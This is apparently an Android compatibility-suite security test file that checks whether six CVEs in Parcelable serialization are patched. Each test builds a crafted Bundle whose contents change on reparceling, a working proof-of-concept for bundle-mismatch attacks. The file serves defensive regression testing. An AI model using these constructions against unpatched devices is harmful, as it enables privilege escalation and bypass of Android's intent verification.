/*
 * Copyright (C) 2018 The AndroCid Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import android.test.AndroidTestCase;

import android.app.Activity;
import android.os.BaseBundle;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.view.AbsSavedState;
import android.view.View;
import android.view.View.BaseSavedState;
import android.annotation.SuppressLint;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Random;

import android.security.cts.R;
import android.platform.test.annotations.SecurityTest;

public class AmbiguousBundlesTest extends AndroidTestCase {

    /**
     * b/140417434
     * Vulnerability Behaviour: Failure via Exception
     */
    @SecurityTest(minPatchLevel = "2020-04")
    public void test_android_CVE_2020_0082() throws Exception {

        Ambiguator ambiguator = new Ambiguator() {

            private static final int VAL_STRING = 0;
            private static final int VAL_PARCELABLEARRAY = 16;
            private static final int LENGTH_PARCELABLEARRAY = 4;
            private Parcel mContextBinder;
            private int mContextBinderSize;
            private static final int BINDER_TYPE_HANDLE = 0x73682a85;
            private static final int PAYLOAD_DATA_LENGTH = 54;

            {
                mContextBinder = Parcel.obtain();
                mContextBinder.writeInt(BINDER_TYPE_HANDLE);
                for (int i = 0; i < 20; i++) {
                    mContextBinder.writeInt(0);
                }
                mContextBinder.setDataPosition(0);
                mContextBinder.readStrongBinder();
                mContextBinderSize = mContextBinder.dataPosition();
            }

            private String fillString(int length) {
                return new String(new char[length]).replace('\0', 'A');
            }


            private String stringForInts(int... values) {
                Parcel p = Parcel.obtain();
                p.writeInt(2 * values.length);
                for (int value : values) {
                    p.writeInt(value);
                }
                p.writeInt(0);
                p.setDataPosition(0);
                String s = p.readString();
                p.recycle();
                return s;
            }

            private void writeContextBinder(Parcel parcel) {
                parcel.appendFrom(mContextBinder, 0, mContextBinderSize);
            }

            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
                // Find key that has hash below everything else
                Random random = new Random(1234);
                int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key, key2;
                int keyHash, key2Hash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                do {
                    key2 = randomString(random);
                    key2Hash = key2.hashCode();
                } while (key2Hash >= minHash || keyHash == key2Hash);

                if (keyHash > key2Hash) {
                    String tmp = key;
                    key = key2;
                    key2 = tmp;
                }

                // Pad bundles
                padBundle(postReSerialize, preReSerialize.size(), minHash, random);
                padBundle(preReSerialize, postReSerialize.size(), minHash, random);

                // Write bundle
                Parcel parcel = Parcel.obtain();

                int sizePosition = parcel.dataPosition();
                parcel.writeInt(0);
                parcel.writeInt(BUNDLE_MAGIC);
                int startPosition = parcel.dataPosition();
                parcel.writeInt(preReSerialize.size() + 2);

                parcel.writeString(key);
                parcel.writeInt(VAL_PARCELABLEARRAY);
                parcel.writeInt(LENGTH_PARCELABLEARRAY);
                parcel.writeString("android.os.ExternalVibration");
                parcel.writeInt(0);
                parcel.writeString(null);
                parcel.writeInt(0);
                parcel.writeInt(0);
                parcel.writeInt(0);
                parcel.writeInt(0);
                writeContextBinder(parcel);
                writeContextBinder(parcel);

                parcel.writeString(null);
                parcel.writeString(null);
                parcel.writeString(null);

                // Payload
                parcel.writeString(key2);
                parcel.writeInt(VAL_OBJECTARRAY);
                parcel.writeInt(2);
                parcel.writeInt(VAL_STRING);
                parcel.writeString(
                        fillString(PAYLOAD_DATA_LENGTH) + stringForInts(VAL_INTARRAY, 5));
                parcel.writeInt(VAL_BUNDLE);
                parcel.writeBundle(postReSerialize);

                // Data from preReSerialize bundle
                writeBundleSkippingHeaders(parcel, preReSerialize);

                // Fix up bundle size
                int bundleDataSize = parcel.dataPosition() - startPosition;
                parcel.setDataPosition(sizePosition);
                parcel.writeInt(bundleDataSize);

                parcel.setDataPosition(0);
                Bundle bundle = parcel.readBundle();
                parcel.recycle();
                return bundle;
            }
        };

        testAmbiguator(ambiguator);
    }

    /*
     * b/71992105
     */
    @SecurityTest(minPatchLevel = "2018-05")
    public void test_android_CVE_2017_13310() throws Exception {

        Ambiguator ambiguator = new Ambiguator() {

            {
                parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
                parcelledDataField.setAccessible(true);
            }

            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
                Random random = new Random(1234);
                int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key;
                int keyHash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                padBundle(postReSerialize, preReSerialize.size(), minHash, random);
                padBundle(preReSerialize, postReSerialize.size(), minHash, random);

                String key2;
                int key2Hash;
                do {
                    key2 = makeStringToInject(random);
                    key2Hash = key2.hashCode();
                } while (key2Hash >= minHash || key2Hash <= keyHash);


                Parcel parcel = Parcel.obtain();

                parcel.writeInt(preReSerialize.size() + 2);
                parcel.writeString(key);

                parcel.writeInt(VAL_PARCELABLE);
                parcel.writeString("com.android.internal.widget.ViewPager$SavedState");

                (new View.BaseSavedState(AbsSavedState.EMPTY_STATE)).writeToParcel(parcel, 0);

                parcel.writeString(key2);
                parcel.writeInt(VAL_BUNDLE);
                parcel.writeBundle(postReSerialize);

                writeBundleSkippingHeaders(parcel, preReSerialize);

                parcel.setDataPosition(0);
                Bundle bundle = new Bundle();
                parcelledDataField.set(bundle, parcel);
                return bundle;
            }

            private String makeStringToInject(Random random) {
                Parcel p = Parcel.obtain();
                p.writeInt(VAL_INTARRAY);
                p.writeInt(13);

                for (int i = 0; i < VAL_INTARRAY / 2; i++) {
                    int paddingVal;
                    if(1 > 3) {
                        paddingVal = 0x420041 + (i << 17) + (i << 1);
                    } else {
                        paddingVal = random.nextInt();
                    }
                    p.writeInt(paddingVal);
                }

                p.setDataPosition(0);
                String result = p.readString();
                p.recycle();
                return result;
            }
        };

        testAmbiguator(ambiguator);
    }

    /*
     * b/71508348
     */
    @SecurityTest(minPatchLevel = "2018-06")
    public void test_android_CVE_2018_9339() throws Exception {

        Ambiguator ambiguator = new Ambiguator() {

            private static final String BASE_PARCELABLE = "android.telephony.CellInfo";
            private final Parcelable smallerParcelable;
            private final Parcelable biggerParcelable;

            {
                parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
                parcelledDataField.setAccessible(true);

                smallerParcelable = (Parcelable) Class.forName("android.telephony.CellInfoGsm").newInstance();
                biggerParcelable = (Parcelable) Class.forName("android.telephony.CellInfoLte").newInstance();

                Parcel p = Parcel.obtain();
                smallerParcelable.writeToParcel(p, 0);
                int smallerParcelableSize = p.dataPosition();
                biggerParcelable.writeToParcel(p, 0);
                int biggerParcelableSize = p.dataPosition() - smallerParcelableSize;
                p.recycle();

                if (smallerParcelableSize >= biggerParcelableSize) {
                    throw new AssertionError("smallerParcelableSize >= biggerParcelableSize");
                }
            }

            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
                // Find key that has hash below everything else
                Random random = new Random(1234);
                int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key;
                int keyHash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                // Pad bundles
                padBundle(postReSerialize, preReSerialize.size() + 1, minHash, random);
                padBundle(preReSerialize, postReSerialize.size() - 1, minHash, random);

                // Write bundle
                Parcel parcel = Parcel.obtain();

                parcel.writeInt(preReSerialize.size() + 1); // Num key-value pairs
                parcel.writeString(key); // Key

                parcel.writeInt(VAL_PARCELABLE);
                parcel.writeString("android.service.autofill.SaveRequest");

                // read/writeTypedArrayList
                parcel.writeInt(2); // Number of items in typed array list
                parcel.writeInt(1); // Item present flag
                parcel.writeString(BASE_PARCELABLE);
                biggerParcelable.writeToParcel(parcel, 0);
                parcel.writeInt(1); // Item present flag
                smallerParcelable.writeToParcel(parcel, 0);

                // read/writeBundle
                int bundleLengthPosition = parcel.dataPosition();
                parcel.writeInt(0); // Placeholder, will be replaced
                parcel.writeInt(BUNDLE_MAGIC);
                int bundleStart = parcel.dataPosition();
                for (int i = 0; i < INNER_BUNDLE_PADDING; i++) {
                    parcel.writeInt(414100 + i); // Padding in inner bundle
                }
                parcel.writeInt(-1); // Inner bundle length after re-de-serialization (-1 = null Bundle)
                writeBundleSkippingHeaders(parcel, postReSerialize);
                int bundleEnd = parcel.dataPosition();

                // Update inner Bundle length
                parcel.setDataPosition(bundleLengthPosition);
                parcel.writeInt(bundleEnd - bundleStart);
                parcel.setDataPosition(bundleEnd);

                // Write original Bundle contents
                writeBundleSkippingHeaders(parcel, preReSerialize);

                // Package crafted Parcel into Bundle so it can be used in regular Android APIs
                parcel.setDataPosition(0);
                Bundle bundle = new Bundle();
                parcelledDataField.set(bundle, parcel);
                return bundle;
            }
        };

        testAmbiguator(ambiguator);
    }

    /*
     * b/62998805
     */
    @SecurityTest(minPatchLevel = "2017-10")
    public void test_android_CVE_2017_0806() throws Exception {
        Ambiguator ambiguator = new Ambiguator() {
            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
                Random random = new Random(1234);
                int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key;
                int keyHash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                padBundle(postReSerialize, preReSerialize.size() + 1, minHash, random);
                padBundle(preReSerialize, postReSerialize.size() - 1, minHash, random);

                String key2;
                int key2Hash;
                do {
                    key2 = makeStringToInject(postReSerialize, random);
                    key2Hash = key2.hashCode();
                } while (key2Hash >= minHash || key2Hash <= keyHash);


                Parcel parcel = Parcel.obtain();

                parcel.writeInt(preReSerialize.size() + 2);
                parcel.writeString(key);

                parcel.writeInt(VAL_PARCELABLE);
                parcel.writeString("android.service.gatekeeper.GateKeeperResponse");

                parcel.writeInt(0);
                parcel.writeInt(0);
                parcel.writeInt(0);

                parcel.writeString(key2);
                parcel.writeInt(VAL_NULL);

                writeBundleSkippingHeaders(parcel, preReSerialize);

                parcel.setDataPosition(0);
                Bundle bundle = new Bundle();
                parcelledDataField.set(bundle, parcel);
                return bundle;
            }
        };

        testAmbiguator(ambiguator);
    }

    /*
     * b/73252178
     */
    @SecurityTest(minPatchLevel = "2018-05")
    public void test_android_CVE_2017_13311() throws Exception {
        Ambiguator ambiguator = new Ambiguator() {
            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
               Random random = new Random(1234);
               int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key;
                int keyHash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                padBundle(postReSerialize, preReSerialize.size(), minHash, random);
                padBundle(preReSerialize, postReSerialize.size(), minHash, random);

                Parcel parcel = Parcel.obtain();

                parcel.writeInt(preReSerialize.size() + 1);
                parcel.writeString(key);

                parcel.writeInt(VAL_OBJECTARRAY);
                parcel.writeInt(3);

                parcel.writeInt(VAL_PARCELABLE);
                parcel.writeString("com.android.internal.app.procstats.ProcessStats");

                parcel.writeInt(PROCSTATS_MAGIC);
                parcel.writeInt(PROCSTATS_PARCEL_VERSION);
                parcel.writeInt(PROCSTATS_STATE_COUNT);
                parcel.writeInt(PROCSTATS_ADJ_COUNT);
                parcel.writeInt(PROCSTATS_PSS_COUNT);
                parcel.writeInt(PROCSTATS_SYS_MEM_USAGE_COUNT);
                parcel.writeInt(PROCSTATS_SPARSE_MAPPING_TABLE_ARRAY_SIZE);

                parcel.writeLong(0);
                parcel.writeLong(0);
                parcel.writeLong(0);
                parcel.writeLong(0);
                parcel.writeLong(0);
                parcel.writeString(null);
                parcel.writeInt(0);
                parcel.writeInt(0);

                parcel.writeInt(0);
                parcel.writeInt(0);
                parcel.writeInt(1);
                parcel.writeInt(1);
                parcel.writeInt(0);

                for (int i = 0; i < PROCSTATS_ADJ_COUNT; i++) {
                    parcel.writeInt(0);
                }

                parcel.writeInt(0);
                parcel.writeInt(1);
                parcel.writeInt(0);

                parcel.writeInt(0);
                parcel.writeInt(0);
                parcel.writeInt(1);
                parcel.writeInt(VAL_LONGARRAY);
                parcel.writeString("AAAAA");
                parcel.writeInt(0);

                parcel.writeInt(VAL_INTEGER);
                parcel.writeInt(0);
                parcel.writeInt(VAL_BUNDLE);
                parcel.writeBundle(postReSerialize);

                writeBundleSkippingHeaders(parcel, preReSerialize);

                parcel.setDataPosition(0);
                Bundle bundle = new Bundle();
                parcelledDataField.set(bundle, parcel);
                return bundle;
            }
        };

        testAmbiguator(ambiguator);
    }

    /*
     * b/71714464
     */
    @SecurityTest(minPatchLevel = "2018-04")
    public void test_android_CVE_2017_13287() throws Exception {
        Ambiguator ambiguator = new Ambiguator() {
            @Override
            public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
                Random random = new Random(1234);
                int minHash = 0;
                for (String s : preReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }
                for (String s : postReSerialize.keySet()) {
                    minHash = Math.min(minHash, s.hashCode());
                }

                String key;
                int keyHash;

                do {
                    key = randomString(random);
                    keyHash = key.hashCode();
                } while (keyHash >= minHash);

                padBundle(postReSerialize, preReSerialize.size() + 1, minHash, random);
                padBundle(preReSerialize, postReSerialize.size() - 1, minHash, random);

                String key2;
                int key2Hash;
                do {
                    key2 = makeStringToInject(postReSerialize, random);
                    key2Hash = key2.hashCode();
                } while (key2Hash >= minHash || key2Hash <= keyHash);


                Parcel parcel = Parcel.obtain();

                parcel.writeInt(preReSerialize.size() + 2);
                parcel.writeString(key);

                parcel.writeInt(VAL_PARCELABLE);
                parcel.writeString("com.android.internal.widget.VerifyCredentialResponse");

                parcel.writeInt(0);
                parcel.writeInt(0);

                parcel.writeString(key2);
                parcel.writeInt(VAL_NULL);

                writeBundleSkippingHeaders(parcel, preReSerialize);

                parcel.setDataPosition(0);
                Bundle bundle = new Bundle();
                parcelledDataField.set(bundle, parcel);
                return bundle;
            }
        };

        testAmbiguator(ambiguator);
    }

    private void testAmbiguator(Ambiguator ambiguator) {
        Bundle bundle;
        Bundle verifyMe = new Bundle();
        verifyMe.putString("cmd", "something_safe");
        Bundle useMe = new Bundle();
        useMe.putString("cmd", "replaced_thing");

        try {
            bundle = ambiguator.make(verifyMe, useMe);

            bundle = reparcel(bundle);
            String value1 = bundle.getString("cmd");
            bundle = reparcel(bundle);
            String value2 = bundle.getString("cmd");

            if (!value1.equals(value2)) {
                fail("String " + value1 + "!=" + value2 + " after reparceling.");
            }
        } catch (Exception e) {
        }
    }

    @SuppressLint("ParcelClassLoader")
    private Bundle reparcel(Bundle source) {
        Parcel p = Parcel.obtain();
        p.writeBundle(source);
        p.setDataPosition(0);
        Bundle copy = p.readBundle();
        p.recycle();
        return copy;
    }

    static abstract class Ambiguator {

        protected static final int VAL_NULL = -1;
        protected static final int VAL_INTEGER = 1;
        protected static final int VAL_BUNDLE = 3;
        protected static final int VAL_PARCELABLE = 4;
        protected static final int VAL_OBJECTARRAY = 17;
        protected static final int VAL_INTARRAY = 18;
        protected static final int VAL_LONGARRAY = 19;
        protected static final int BUNDLE_SKIP = 12;

        protected static final int PROCSTATS_MAGIC = 0x50535454;
        protected static final int PROCSTATS_PARCEL_VERSION = 21;
        protected static final int PROCSTATS_STATE_COUNT = 14;
        protected static final int PROCSTATS_ADJ_COUNT = 8;
        protected static final int PROCSTATS_PSS_COUNT = 7;
        protected static final int PROCSTATS_SYS_MEM_USAGE_COUNT = 16;
        protected static final int PROCSTATS_SPARSE_MAPPING_TABLE_ARRAY_SIZE = 4096;

        protected static final int BUNDLE_MAGIC = 0x4C444E42;
        protected static final int INNER_BUNDLE_PADDING = 1;

        protected Field parcelledDataField;

        public Ambiguator() throws Exception {
            parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
            parcelledDataField.setAccessible(true);
        }

        abstract public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception;

        protected String makeStringToInject(Bundle stuffToInject, Random random) {
            Parcel p = Parcel.obtain();
            p.writeInt(0);
            p.writeInt(0);

            Parcel p2 = Parcel.obtain();
            stuffToInject.writeToParcel(p2, 0);
            int p2Len = p2.dataPosition() - BUNDLE_SKIP;

            for (int i = 0; i < p2Len / 4 + 4; i++) {
                int paddingVal;
                if (i > 3) {
                    paddingVal = i;
                } else {
                    paddingVal = random.nextInt();
                }
                p.writeInt(paddingVal);

            }

            p.appendFrom(p2, BUNDLE_SKIP, p2Len);
            p2.recycle();

            while (p.dataPosition() % 8 != 0) p.writeInt(0);
            for (int i = 0; i < 2; i++) {
                p.writeInt(0);
            }

            int len = p.dataPosition() / 2 - 1;
            p.writeInt(0); p.writeInt(0);
            p.setDataPosition(0);
            p.writeInt(len);
            p.writeInt(len);
            p.setDataPosition(0);
            String result = p.readString();
            p.recycle();
            return result;
        }

        protected static void writeBundleSkippingHeaders(Parcel parcel, Bundle bundle) {
            Parcel p2 = Parcel.obtain();
            bundle.writeToParcel(p2, 0);
            parcel.appendFrom(p2, BUNDLE_SKIP, p2.dataPosition() - BUNDLE_SKIP);
            p2.recycle();
        }

        protected static String randomString(Random random) {
            StringBuilder b = new StringBuilder();
            for (int i = 0; i < 6; i++) {
                b.append((char)(' ' + random.nextInt('~' - ' ' + 1)));
            }
            return b.toString();
        }

        protected static void padBundle(Bundle bundle, int size, int minHash, Random random) {
            while (bundle.size() < size) {
                String key;
                do {
                    key = randomString(random);
                } while (key.hashCode() < minHash || bundle.containsKey(key));
                bundle.putString(key, "PADDING");
            }
        }
    }
}
